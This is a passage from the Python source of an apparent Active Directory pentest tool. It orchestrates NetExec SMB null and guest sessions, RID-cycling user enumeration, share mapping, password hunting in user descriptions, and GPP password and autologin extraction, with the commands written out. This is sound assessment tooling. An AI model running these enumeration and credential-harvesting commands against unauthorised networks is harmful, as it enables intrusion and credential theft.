"""SMB CLI orchestration helpers.

This module extracts SMB-related orchestration logic out of the monolithic
`adscan.py` so it can be reused by future UX layers while keeping runtime
behaviour stable for the current CLI.

Note: This module handles SMB enumeration and operations. For credential
extraction operations (dumps), see `dumps.py`.
"""

from __future__ import annotations

from typing import Any
from datetime import datetime, timedelta, timezone
import csv
import json
import os
import re
import shlex
import threading
import time
import traceback
import rich
from rich.panel import Panel
from rich.prompt import Confirm
from rich.table import Table
from rich.text import Text

from adscan_internal import (
    print_error,
    print_error_debug,
    print_exception,
    print_info,
    print_info_debug,
    print_instruction,
    print_info_verbose,
    print_panel,
    print_operation_header,
    print_success,
    print_warning,
    print_warning_debug,
    telemetry,
)
from adscan_internal.integrations.netexec.parsers import (
    parse_smb_share_map,
    parse_smb_usernames,
    parse_smb_user_descriptions,
    summarize_share_map,
)
from adscan_internal.text_utils import strip_ansi_codes
from adscan_internal.rich_output import (
    BRAND_COLORS,
    mark_sensitive,
    print_panel_with_table,
)
from adscan_internal.workspaces.subpaths import domain_path, domain_relpath


GLOBAL_SMB_MAPPING_EXCLUDED_SHARES: tuple[str, ...] = (
    "print$",
    "ipc$",
    "admin$",
)
GLOBAL_SMB_MAPPING_EXCLUDED_DRIVE_SHARES: tuple[str, ...] = tuple(
    f"{letter}$" for letter in "abcdefghijklmnopqrstuvwxyz"
)
GLOBAL_SMB_MAPPING_EXCLUDE_FILTER_TOKENS: tuple[str, ...] = (
    GLOBAL_SMB_MAPPING_EXCLUDED_SHARES + GLOBAL_SMB_MAPPING_EXCLUDED_DRIVE_SHARES
)
GLOBAL_SMB_MAPPING_EXCLUDED_EXTENSIONS: tuple[str, ...] = ("ico", "lnk")
GLOBAL_SMB_MAPPING_EXCLUDED_SHARES_CASEFOLD: set[str] = {
    name.casefold() for name in GLOBAL_SMB_MAPPING_EXCLUDE_FILTER_TOKENS
}


def _is_globally_excluded_mapping_share(share_name: str) -> bool:
    """Return True when share is excluded by global SMB mapping policy."""
    return (
        str(share_name or "").strip().casefold()
        in GLOBAL_SMB_MAPPING_EXCLUDED_SHARES_CASEFOLD
    )


def _filter_shares_by_global_mapping_exclusions(shares: list[str]) -> list[str]:
    """Filter share names according to global SMB mapping exclusions."""
    filtered: list[str] = []
    seen: set[str] = set()
    for share in shares:
        share_name = str(share or "").strip()
        if not share_name:
            continue
        key = share_name.casefold()
        if key in seen:
            continue
        seen.add(key)
        if _is_globally_excluded_mapping_share(share_name):
            continue
        filtered.append(share_name)
    return filtered


def _filter_share_map_by_global_mapping_exclusions(
    share_map: dict[str, dict[str, str]] | None,
) -> dict[str, dict[str, str]] | None:
    """Filter host/share permissions map according to global mapping exclusions."""
    if not isinstance(share_map, dict):
        return share_map
    filtered: dict[str, dict[str, str]] = {}
    for host, host_shares in share_map.items():
        if not isinstance(host_shares, dict):
            continue
        filtered_host_shares: dict[str, str] = {}
        for share_name, perms in host_shares.items():
            normalized_share = str(share_name or "").strip()
            if not normalized_share or _is_globally_excluded_mapping_share(
                normalized_share
            ):
                continue
            filtered_host_shares[normalized_share] = str(perms or "")
        if filtered_host_shares:
            filtered[str(host or "").strip()] = filtered_host_shares
    return filtered


def execute_netexec_shares(
    shell: Any,
    *,
    command: str,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Execute a NetExec SMB share enumeration and render the results.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        command: Full NetExec command to run.
        domain: Target domain.
        username: Session username label (e.g., "null", "guest", actual user).
        password: Session password/hash (for follow-up actions).
    """
    try:
        completed_process = shell._run_netexec(command, domain=domain, pre_sync=False)
        output = completed_process.stdout if completed_process else ""

        if completed_process and completed_process.returncode == 0:
            output_str = output
            if "[ADSCAN] NETEXEC_SKIPPED_DUE_TO_TIMEOUT" in output_str:
                marked_domain = mark_sensitive(domain, "domain")
                marked_username = mark_sensitive(username, "user")
                print_warning(
                    "Skipped SMB shares enumeration for "
                    f"{marked_domain} as {marked_username} due to repeated timeouts."
                )
                return

            if "STATUS_NOT_SUPPORTED" in output_str:
                print_info_verbose(
                    "NTLM does not support shares enumeration. Using kerberos instead."
                )
                auth = shell.build_auth_nxc(username, password, domain, kerberos=True)
                log_path = domain_relpath(
                    shell.domains_dir, domain, "smb", f"smb_{username}_shares.log"
                )
                command_fallback = (
                    f"{shell.netexec_path} smb enabled_computers.txt {auth} "
                    f"-t 10 --timeout 60 --smb-timeout 30 --shares --log "
                    f"{log_path} "
                )
                execute_netexec_shares(
                    shell,
                    command=command_fallback,
                    domain=domain,
                    username=username,
                    password=password,
                )
                return

            if (
                "STATUS_LOGON_FAILURE" in output_str
                or "STATUS_ACCESS_DENIED" in output_str
            ):
                marked_username = mark_sensitive(username, "user")
                marked_domain = mark_sensitive(domain, "domain")
                print_error(
                    f"{marked_username} sessions not accepted on any share of {marked_domain}"
                )
                return

            share_map = parse_smb_share_map(output_str)
            read_shares, write_shares, read_hosts, _write_hosts = summarize_share_map(
                share_map
            )

            if share_map:
                ip_table = Table(
                    title=(
                        f"[bold cyan]SMB Shares discovered on {domain} "
                        f"({username} session)[/bold cyan]"
                    ),
                    header_style="bold magenta",
                    box=rich.box.SIMPLE_HEAVY,
                )
                ip_table.add_column("Host", style="cyan")
                ip_table.add_column("Share", style="cyan")
                ip_table.add_column("Permission", style="green")

                priority_shares = ["SYSVOL", "NETLOGON"]
                for host in sorted(share_map.keys()):
                    shares_dict = share_map[host]
                    ordered = [s for s in priority_shares if s in shares_dict] + sorted(
                        [s for s in shares_dict if s not in priority_shares]
                    )
                    first = True
                    for share_name in ordered:
                        perm = shares_dict[share_name]
                        col = "magenta" if "WRITE" in perm else "cyan"
                        ip_table.add_row(
                            host if first else "",
                            share_name,
                            f"[{col}]{perm}[/{col}]",
                        )
                        first = False
                shell.console.print(Panel(ip_table, border_style="bright_blue"))
            else:
                shell.console.print(
                    Panel(
                        Text(
                            "No SMB shares with READ or WRITE permissions were found.",
                            style="yellow",
                        ),
                        border_style="yellow",
                    )
                )

            if (read_shares or write_shares) and shell.domains_data[domain][
                "auth"
            ] != "auth":
                shell.domains_data[domain]["auth"] = username

            if read_shares:
                shell.ask_for_smb_shares_read(
                    domain,
                    read_shares,
                    username,
                    password,
                    list(read_hosts),
                    share_map=share_map,
                )

            if any(share.upper() == "SYSVOL" for share in (read_shares + write_shares)):
                shell.ask_for_smb_gpp(domain)
            return

        marked_domain = mark_sensitive(domain, "domain")
        marked_username = mark_sensitive(username, "user")
        print_error(
            f"Error executing netexec in domain {marked_domain} with a {marked_username} session."
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_error("An error occurred while executing the command.")
        print_exception(show_locals=False, exception=exc)


def execute_smb_rid_cycling(shell: Any, *, command: str, domain: str) -> None:
    """Execute RID cycling via NetExec and store discovered usernames.

    Refactored to use RIDCyclingService from services.enumeration.rid_cycling
    for better separation of concerns and reusability.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        command: Full NetExec command to run.
        domain: Target domain.
    """
    from adscan_internal.services.enumeration.rid_cycling import RIDCyclingService

    try:
        # Extract PDC and auth args from command
        # Command format: {netexec_path} smb {pdc} {auth_args} --rid-brute {max_rid} --log {log}
        parts = command.split()
        pdc_index = -1
        auth_start = -1
        for i, part in enumerate(parts):
            if part == "smb" and i + 1 < len(parts):
                pdc_index = i + 1
            elif part.startswith("-u") and auth_start == -1:
                auth_start = i

        if pdc_index == -1 or pdc_index >= len(parts):
            print_error("Could not parse PDC from RID cycling command")
            return

        pdc = parts[pdc_index]
        max_rid = 2000
        auth_args = "-u 'ADscan' -p ''"

        # Extract max_rid from command
        for i, part in enumerate(parts):
            if part == "--rid-brute" and i + 1 < len(parts):
                try:
                    max_rid = int(parts[i + 1])
                except ValueError:
                    pass
            elif part.startswith("-u") and i + 1 < len(parts):
                # Extract auth args: -u 'value' -p 'value'
                auth_parts = []
                j = i
                while j < len(parts) and j < i + 5:
                    auth_parts.append(parts[j])
                    if parts[j].startswith("-p"):
                        if j + 1 < len(parts):
                            auth_parts.append(parts[j + 1])
                        break
                    j += 1
                if auth_parts:
                    auth_args = " ".join(auth_parts)

        # Check for --local-auth flag
        has_local_auth = "--local-auth" in parts
        if has_local_auth:
            auth_args += " --local-auth"

        # Use RIDCyclingService for initial enumeration
        get_license_mode = getattr(shell, "_get_license_mode_enum", None)
        if callable(get_license_mode):
            license_mode = get_license_mode()
        else:
            from adscan_internal.core import LicenseMode

            raw_license = str(getattr(shell, "license_mode", "PRO") or "PRO").upper()
            license_mode = (
                LicenseMode.LITE if raw_license == "LITE" else LicenseMode.PRO
            )

        rid_service = RIDCyclingService(
            event_bus=None,
            license_mode=license_mode,
        )

        result = rid_service.enumerate_users_by_rid(
            domain=domain,
            pdc=pdc,
            netexec_path=shell.netexec_path or "",
            auth_args=auth_args,
            max_rid=max_rid,
            timeout=300,
            scan_id=None,
        )

        output_str = result.raw_output
        if "SidTypeUser" in output_str:
            marked_domain = mark_sensitive(domain, "domain")
            print_success(
                f"RID cycling successful with a guest session on domain {marked_domain}"
            )
            # Expand to 10000 RIDs for full enumeration
            if max_rid < 10000:
                print_info("Enumerating users by RID")
                expanded_result = rid_service.enumerate_users_by_rid(
                    domain=domain,
                    pdc=pdc,
                    netexec_path=shell.netexec_path or "",
                    auth_args=auth_args,
                    max_rid=10000,
                    timeout=300,
                    scan_id=None,
                )
                users = expanded_result.usernames
            else:
                users = result.usernames

            if users:
                shell.domains_data[domain]["auth"] = "guest"
                shell._write_user_list_file(domain, "users.txt", users)
                shell._postprocess_user_list_file(domain, "users.txt")
            return

        if "STATUS_NO_LOGON_SERVERS" in output_str or "NETBIOS" in output_str:
            if not has_local_auth:
                command_added = f"{command} --local-auth"
                execute_smb_rid_cycling(shell, command=command_added, domain=domain)
                return

        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Could not obtain usernames through RID cycling with a guest session on domain "
            f"{marked_domain}."
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_error("Error executing RID cycling.")
        print_exception(show_locals=False, exception=exc)


def run_null_shares(shell: Any, *, domain: str) -> None:
    """Run SMB share enumeration via a null session and render results."""
    if shell.type == "ctf" and shell.domains_data[domain]["auth"] in ["auth", "pwned"]:
        return
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return

    print_operation_header(
        "Null Session Share Enumeration",
        details={
            "Domain": domain,
            "PDC": shell.domains_data[domain]["pdc"],
            "Type": "SMB Shares Enumeration",
            "Authentication": "Anonymous (Null Session)",
        },
        icon="📂",
    )

    log_path = domain_relpath(shell.domains_dir, domain, "smb", "smb_null_shares.log")
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} "
        f'-u "" -p "" --shares --log {log_path} '
    )
    print_info_debug(f"Command: {command}")
    execute_netexec_shares(
        shell,
        command=command,
        domain=domain,
        username="null",
        password="",
    )


def run_guest_shares(shell: Any, *, domain: str) -> None:
    """Run SMB share enumeration via guest session and render results."""
    if shell.type == "ctf" and shell.domains_data[domain]["auth"] in ["auth", "pwned"]:
        return
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return

    enabled_computers = domain_relpath(
        shell.domains_dir, domain, "enabled_computers_ips.txt"
    )
    smb_ips = domain_relpath(shell.domains_dir, domain, "smb", "ips.txt")
    if os.path.exists(enabled_computers):
        target_path = enabled_computers
    else:
        target_path = smb_ips

    print_operation_header(
        "Guest Session Share Enumeration",
        details={
            "Domain": domain,
            "Target": target_path,
            "Type": "SMB Shares Enumeration",
            "Authentication": "Guest Account (ADscan)",
            "Threads": "16",
        },
        icon="👤",
    )

    log_path = domain_relpath(shell.domains_dir, domain, "smb", "smb_guest_shares.log")
    command = (
        f'{shell.netexec_path} smb {target_path} -u "ADscan" -p "" '
        f"-t 10 --timeout 60 --smb-timeout 30 --shares --log "
        f"{log_path} "
    )
    print_info_debug(f"Command: {command}")
    execute_netexec_shares(
        shell,
        command=command,
        domain=domain,
        username="guest",
        password="",
    )


def run_auth_shares(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Run authenticated SMB share enumeration and render results."""
    if domain not in shell.domains:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"Domain '{marked_domain}' is not configured. Please add or select a valid domain."
        )
        return
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return

    auth = shell.build_auth_nxc(username, password, domain)
    marked_username = mark_sensitive(username, "user")
    log_path = domain_relpath(
        shell.domains_dir, domain, "smb", f"smb_{username}_shares.log"
    )
    command = (
        f"{shell.netexec_path} smb enabled_computers_ips.txt {auth} "
        f"-t 10 --timeout 60 --smb-timeout 30 --shares --log "
        f"{log_path} "
    )
    marked_domain = mark_sensitive(domain, "domain")
    print_info(
        f"Checking shares access as user {marked_username} in domain {marked_domain}"
    )
    print_info_debug(f"Command: {command}")
    execute_netexec_shares(
        shell,
        command=command,
        domain=domain,
        username=username,
        password=password,
    )


def run_rid_cycling(shell: Any, *, domain: str) -> None:
    """Run RID cycling against PDC and write discovered users list."""
    if shell.type == "ctf" and shell.domains_data[domain]["auth"] in ["auth", "pwned"]:
        return

    print_operation_header(
        "RID Cycling Enumeration",
        details={
            "Domain": domain,
            "PDC": shell.domains_data[domain]["pdc"],
            "Method": "Guest Session",
            "Output": f"domains/{domain}/smb/smb_rid.log",
        },
        icon="🔢",
    )

    rid_log = domain_relpath(shell.domains_dir, domain, "smb", "smb_rid.log")
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} "
        f'-u "ADscan" -p "" --rid-brute 2000 --log '
        f"{rid_log}"
    )
    print_info_debug(f"Command: {command}")
    execute_smb_rid_cycling(shell, command=command, domain=domain)


def execute_netexec_smb_descriptions(shell: Any, *, command: str, domain: str) -> None:
    """Execute NetExec SMB descriptions enumeration and parse results.

    This function executes the NetExec command, parses user descriptions from output,
    displays them with Rich formatting, and optionally analyzes them for passwords
    using CredSweeper.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        command: Full NetExec command to run.
        domain: Target domain.
    """
    try:
        completed_process = shell._run_netexec(
            command,
            domain=domain,
            timeout=300,
        )

        # Check the process output
        if completed_process.returncode == 0:
            raw_output = completed_process.stdout or ""
            output_str = strip_ansi_codes(raw_output)

            if not output_str.strip():
                marked_domain = mark_sensitive(domain, "domain")
                print_warning(
                    f"No SMB descriptions found or command produced no output for domain {marked_domain}."
                )
                return

            marked_domain = mark_sensitive(domain, "domain")
            print_info_verbose(
                f"User Descriptions from SMB for domain {marked_domain} (raw output length: {len(output_str)} chars)"
            )

            # Parse SMB user descriptions using parser
            user_descriptions = parse_smb_user_descriptions(output_str)

            if not user_descriptions:
                print_warning(
                    "[smb-desc] No user descriptions were parsed from SMB output."
                )
                return

            marked_domain = mark_sensitive(domain, "domain")
            print_success(
                f"Parsed {len(user_descriptions)} user description(s) from SMB for domain {marked_domain}."
            )

            # Display parsed descriptions using Rich
            _display_user_descriptions_with_rich(shell, user_descriptions)

            # Analyze descriptions for passwords using CredSweeper if available
            if getattr(shell, "credsweeper_path", None):
                workspace_cwd = shell._get_workspace_cwd()
                smb_dir = domain_path(
                    workspace_cwd, shell.domains_dir, domain, shell.smb_dir
                )
                os.makedirs(smb_dir, exist_ok=True)
                descriptions_file = os.path.join(smb_dir, "smb_descriptions.log")

                # Save descriptions to file for CredSweeper analysis
                with open(descriptions_file, "w", encoding="utf-8") as desc_file:
                    for user, desc in sorted(user_descriptions.items()):
                        desc_file.write(f"{user}  {desc}\n")

                print_info_verbose(
                    f"[smb-desc] Saved SMB descriptions to {descriptions_file} for password analysis"
                )

                # Delegate to shell's analysis helper if available
                analyze_helper = getattr(
                    shell, "_analyze_descriptions_for_passwords", None
                )
                if callable(analyze_helper):
                    analyze_helper(descriptions_file, user_descriptions, domain)
        else:
            print_error("Error listing SMB descriptions.")
            if completed_process.stderr:
                print_error(completed_process.stderr)
            elif completed_process.stdout:
                print_error(completed_process.stdout)
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_error("Error executing netexec for SMB descriptions.")
        print_exception(show_locals=False, exception=exc)


def _display_user_descriptions_with_rich(
    shell: Any, user_descriptions: dict[str, str]
) -> None:
    """Display user descriptions in a Rich table.

    Args:
        shell: Shell instance with display helpers.
        user_descriptions: Dictionary mapping username -> description.
    """
    # Use shell's display helper if available, otherwise use our own
    display_helper = getattr(shell, "_display_ldap_descriptions_with_rich", None)
    if callable(display_helper):
        display_helper(user_descriptions)
        return

    # Fallback: create our own Rich table
    table = Table(
        title="[bold cyan]User Descriptions Found[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("Username", style="cyan")
    table.add_column("Description", style="yellow")

    for username, description in sorted(user_descriptions.items()):
        marked_username = mark_sensitive(username, "user")
        marked_description = mark_sensitive(description, "password")
        table.add_row(marked_username, marked_description)

    shell.console.print(Panel(table, border_style="bright_blue"))


def run_smb_descriptions(shell: Any, *, domain: str) -> None:
    """Search for user descriptions over SMB in a target domain via NetExec.

    This mirrors the legacy ``do_netexec_smb_descriptions`` behaviour while
    keeping the orchestration logic outside of ``adscan.py``.
    """
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return

    log_path = domain_relpath(shell.domains_dir, domain, "smb", "null_descriptions.log")
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} "
        f"-u '' -p '' --log {log_path} --users"
    )

    marked_domain = mark_sensitive(domain, "domain")
    marked_auth_type = mark_sensitive(shell.domains_data[domain]["auth"], "domain")
    print_info(
        f"Searching for descriptions in domain {marked_domain} with a {marked_auth_type} session"
    )
    print_info_debug(f"Command: {command}")
    execute_netexec_smb_descriptions(shell, command=command, domain=domain)


def execute_netexec_pass_policy(shell: Any, *, command: str, domain: str) -> None:
    """Execute NetExec password policy command and display results.

    Args:
        shell: Shell instance with domain data and helper methods.
        command: Full NetExec command to run.
        domain: Target domain.
    """
    try:
        completed_process = shell._run_netexec(command, domain=domain, timeout=300)

        if completed_process.returncode == 0:
            if completed_process.stdout:
                clean_stdout = strip_ansi_codes(completed_process.stdout)
                shell.console.print(clean_stdout.strip())
            else:
                print_error(
                    "Command executed successfully, but no output to display for password policy."
                )
        else:
            print_error(
                f"Error searching for the password policy. Return code: {completed_process.returncode}"
            )
            error_message = (
                strip_ansi_codes(completed_process.stderr or "").strip()
                if completed_process.stderr
                else strip_ansi_codes(completed_process.stdout or "").strip()
            )
            if error_message:
                print_error(f"Details: {error_message}")
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error executing netexec for password policy.")
        print_exception(show_locals=False, exception=e)


def run_pass_policy(shell: Any, *, domain: str) -> None:
    """Display the SMB password policy for a domain using NetExec.

    This encapsulates the former ``do_netexec_pass_policy`` logic.
    """
    from adscan_internal.workspaces.subpaths import domain_path

    workspace_cwd = shell._get_workspace_cwd()
    smb_path = domain_path(workspace_cwd, shell.domains_dir, domain, shell.smb_dir)
    os.makedirs(smb_path, exist_ok=True)

    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return

    domain_creds = (
        shell.domains_data.get(domain, {}) if hasattr(shell, "domains_data") else {}
    )
    username = domain_creds.get("username")
    password = domain_creds.get("password")
    if not username or not password:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"Missing credentials for {marked_domain}. Cannot query password policy."
        )
        return

    use_kerberos = False
    if hasattr(shell, "do_sync_clock_with_pdc"):
        use_kerberos = bool(shell.do_sync_clock_with_pdc(domain, verbose=True))
    auth = shell.build_auth_nxc(
        username,
        password,
        domain,
        kerberos=use_kerberos,
    )

    marked_domain = mark_sensitive(domain, "domain")
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} {auth} "
        f"--pass-pol --log domains/{marked_domain}/smb/pass_policy.log"
    )
    print_info_verbose(f"Displaying password policy for domain {marked_domain}")
    execute_netexec_pass_policy(shell, command=command, domain=domain)


def run_smb_scan(shell: Any, *, domain: str) -> None:
    """Perform the unauthenticated SMB scan steps for a domain."""
    if shell._is_ctf_domain_pwned(domain):
        return

    from adscan_internal import print_operation_header

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    print_operation_header(
        "Unauthenticated SMB Scan",
        details={
            "Domain": domain,
            "PDC": pdc,
            "Operations": "Null Session, RID Cycling, Guest Session, Shares Enum",
        },
        icon="🔒",
    )
    if not os.path.exists(domain_relpath(shell.domains_dir, domain, "smb")):
        os.makedirs(domain_relpath(shell.domains_dir, domain, "smb"), exist_ok=True)
    shell.do_netexec_null_general(domain)
    shell.do_rid_cycling(domain)
    shell.do_netexec_null_shares(domain)
    shell.do_netexec_guest(domain)


def run_smb_null_enum_users(shell: Any, *, domain: str) -> None:
    """Create a domain users list via unauthenticated SMB enumeration."""
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} "
        f"-u '' -p '' --users --log "
        f"{domain_relpath(shell.domains_dir, domain, 'smb', 'users_null.log')}"
    )
    print_info("Creating a SMB user list")
    print_info_debug(f"Command: {command}")

    completed_process = shell._run_netexec(command, domain=domain, timeout=300)
    if completed_process is None:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Failed to enumerate SMB users (no result returned) for domain "
            f"{marked_domain}."
        )
        return

    if completed_process.returncode != 0:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(f"Error enumerating SMB users in domain {marked_domain}.")
        error_message = (
            completed_process.stderr or completed_process.stdout or ""
        ).strip()
        if error_message:
            print_error(error_message)
        return

    users = parse_smb_usernames(completed_process.stdout or "")
    shell._write_user_list_file(domain, "users.txt", users)
    shell._postprocess_user_list_file(domain, "users.txt")


def run_guest_shares_local(shell: Any, *, domain: str) -> None:
    """Enumerate SMB shares using guest session with --local-auth."""
    ips_file = domain_relpath(shell.domains_dir, domain, "smb", "ips.txt")
    log_path = domain_relpath(shell.domains_dir, domain, "smb_guest_shares_local.log")
    command = (
        f'{shell.netexec_path} smb {ips_file} -u "ADscan" -p "" -t 10 --timeout 60 --smb-timeout 30 '
        f"--shares --local-auth --log {log_path}"
    )
    print_success("Executing guest session")
    print_info_debug(f"Command: {command}")
    execute_netexec_shares(
        shell,
        command=command,
        domain=domain,
        username="guest",
        password="",
    )


def run_null_general_local(shell: Any, *, domain: str) -> None:
    """Run SMB null session attempt with --local-auth."""
    log_path = domain_relpath(
        shell.domains_dir, domain, "smb", "smb_null_general_local.log"
    )
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} "
        f'-u "" -p "" --pass-pol --local-auth --log {log_path}'
    )
    print_success("Executing guest session")
    print_info_debug(f"Command: {command}")
    shell.execute_netexec_null(command, domain)


def run_rid_cycling_local(shell: Any, *, domain: str) -> None:
    """Run RID cycling with --local-auth."""
    log_path = domain_relpath(shell.domains_dir, domain, "smb", "smb_rid_local.log")
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} "
        f'-u "ADscan" -p "" --local-auth --rid-brute 2000 --log {log_path}'
    )
    print_info("Checking RID cycling for local session")
    print_info_debug(f"Command: {command}")
    execute_smb_rid_cycling(shell, command=command, domain=domain)


def execute_netexec_null(shell: Any, *, command: str, domain: str) -> None:
    """Execute NetExec null session command and handle results.

    This function executes a null session NetExec command, checks for successful
    authentication, updates domain state, and triggers follow-up enumeration if needed.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        command: Full NetExec command to run.
        domain: Target domain.
    """
    import shlex

    def _extract_log_path(cmd: str) -> str | None:
        try:
            parts = shlex.split(cmd)
        except ValueError:
            return None
        if "--log" in parts:
            idx = parts.index("--log")
            if idx + 1 < len(parts):
                return parts[idx + 1]
        return None

    def build_null_session_event_properties():
        return {
            "scan_mode": getattr(shell, "scan_mode", None),
            "auth_type": shell.domains_data.get(domain, {}).get("auth", "unknown"),
            "lab_slug": shell._get_lab_slug(),
        }

    def _capture_event_safe(event: str) -> None:
        """Capture telemetry events without breaking null-session flow on failures."""
        try:
            telemetry.capture(event, build_null_session_event_properties())
        except Exception as exc:  # noqa: BLE001
            print_warning_debug(
                "Telemetry event capture skipped during SMB null-session flow: "
                f"event={event} error={type(exc).__name__}: {exc}"
            )

    try:
        _capture_event_safe("null_session_detection_started")
        completed_process = shell._run_netexec(
            command, domain=domain, timeout=300, pre_sync=False
        )
        errors = completed_process.stderr if completed_process else None

        if completed_process and completed_process.returncode == 0:
            output_str = completed_process.stdout
            if "Complexity" in output_str or "accessible" in output_str:
                marked_domain = mark_sensitive(domain, "domain")
                print_warning(
                    f"null session accepted successfully for domain {marked_domain}."
                )
                shell.update_report_field(domain, "smb_null_domain", True)
                try:
                    from adscan_internal.services.report_service import (
                        record_technical_finding,
                    )

                    log_path = _extract_log_path(command)
                    record_technical_finding(
                        shell,
                        domain,
                        key="smb_null_domain",
                        value=True,
                        details={
                            "pdc": shell.domains_data[domain]["pdc"],
                            "auth_type": "null",
                        },
                        evidence=[
                            {
                                "type": "log",
                                "summary": "SMB null session output",
                                "artifact_path": log_path,
                            }
                        ]
                        if log_path
                        else None,
                    )
                except Exception as exc:  # pragma: no cover
                    telemetry.capture_exception(exc)
                if shell.domains_data[domain]["auth"] != "auth":
                    shell.domains_data[domain]["auth"] = "null"

                # Track null session detection in telemetry
                _capture_event_safe("null_session_detected")

                shell.ask_for_smb_enum_users(domain)
            elif "STATUS_NO_LOGON_SERVERS" in output_str or "NETBIOS" in output_str:
                command_added = command + " --local-auth"
                execute_netexec_null(shell, command=command_added, domain=domain)
            else:
                marked_domain = mark_sensitive(domain, "domain")
                print_error(f"null sessions not accepted for domain {marked_domain}.")
                shell.update_report_field(domain, "smb_null_domain", False)
        else:
            print_error("Error executing netexec.")
            if errors:
                print_error(errors)
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("An error occurred while executing the command.")
        print_exception(show_locals=False, exception=e)


def run_null_general(shell: Any, *, domain: str) -> None:
    """Run SMB null session password policy enumeration via NetExec."""
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return

    print_operation_header(
        "Null Session Attempt",
        details={
            "Domain": domain,
            "PDC": shell.domains_data[domain]["pdc"],
            "Type": "Password Policy Enumeration",
            "Authentication": "Anonymous (Null Session)",
        },
        icon="🔓",
    )

    log_path = domain_relpath(shell.domains_dir, domain, "smb", "smb_null_general.log")
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} "
        f'-u "" -p "" --pass-pol --log {log_path}'
    )
    print_info_debug(f"Command: {command}")
    execute_netexec_null(shell, command=command, domain=domain)


def _resolve_smb_auth_for_domain(shell: Any, domain: str) -> tuple[str, str | None]:
    """Resolve SMB auth type + NetExec auth string for a domain."""
    domain_data = shell.domains_data.get(domain, {})
    auth_value = str(domain_data.get("auth") or "unauth").strip().lower()
    if auth_value in {"auth", "pwned"}:
        username = domain_data.get("username")
        password = domain_data.get("password")
        if username and password:
            return auth_value, shell.build_auth_nxc(username, password, domain)
        return auth_value, None
    return auth_value, None


def run_gpp_autologin(shell: Any, *, target_domain: str) -> None:
    """Enumerate GPP autologin files via NetExec in a target domain."""
    from adscan_internal.rich_output import mark_sensitive

    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return
    if target_domain not in shell.domains:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"Domain '{marked_target_domain}' is not configured. Please add or select a valid domain."
        )
        return

    command: str | None = None
    auth_type, auth = _resolve_smb_auth_for_domain(shell, target_domain)
    if auth:
        command = (
            f"{shell.netexec_path} smb {shell.domains_data[target_domain]['pdc']} "
            f"{auth} --log domains/{target_domain}/smb/gpp_autologin.log -M gpp_autologin"
        )
    elif auth_type == "guest":
        command = (
            f"{shell.netexec_path} smb {shell.domains_data[target_domain]['pdc']} "
            f"-u 'ADscan' -p '' "
            f"--log domains/{target_domain}/smb/gpp_autologin.log -M gpp_autologin"
        )
    elif auth_type == "null":
        command = (
            f"{shell.netexec_path} smb {shell.domains_data[target_domain]['pdc']} "
            f"-u '' -p '' "
            f"--log domains/{target_domain}/smb/gpp_autologin.log -M gpp_autologin"
        )

    if command is None:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"Unsupported auth type for domain {marked_target_domain}: {auth_type}"
        )
        if auth_type in {"auth", "pwned"}:
            print_error(
                "No stored credentials found for this domain. Please add credentials first."
            )
        return

    marked_target_domain = mark_sensitive(target_domain, "domain")
    marked_auth_type = shell.domains_data[target_domain]["auth"]
    print_info_verbose(
        f"Searching for GPP autologin files in domain {marked_target_domain} using a {marked_auth_type} session"
    )
    shell.execute_netexec_gpp(command, "autologin", target_domain)


def run_gpp_passwords(shell: Any, *, target_domain: str) -> None:
    """Enumerate GPP passwords via NetExec in a target domain."""
    from adscan_internal.rich_output import mark_sensitive

    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return
    if target_domain not in shell.domains:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"Domain '{marked_target_domain}' is not configured. Please add or select a valid domain."
        )
        return

    command: str | None = None
    auth_type, auth = _resolve_smb_auth_for_domain(shell, target_domain)
    if auth:
        command = (
            f"{shell.netexec_path} smb {shell.domains_data[target_domain]['pdc']} "
            f"{auth} --log domains/{target_domain}/smb/gpp_password.log -M gpp_password"
        )
    elif auth_type == "guest":
        command = (
